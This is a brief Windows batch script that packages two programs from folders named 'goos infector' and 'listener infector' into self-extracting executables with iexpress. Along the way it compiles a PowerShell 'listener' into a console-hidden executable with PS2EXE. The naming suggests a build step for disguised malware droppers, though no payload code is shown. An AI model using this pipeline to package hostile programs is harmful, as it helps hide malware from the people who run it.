cd "goos infector"
iexpress /n goosinfector.SED
cd ..
cd "listener infector"
powershell -Command Invoke-PS2EXE listener.ps1 listener.exe -noConsole
iexpress /n listenerinfector.SED
del listener.exe
cd..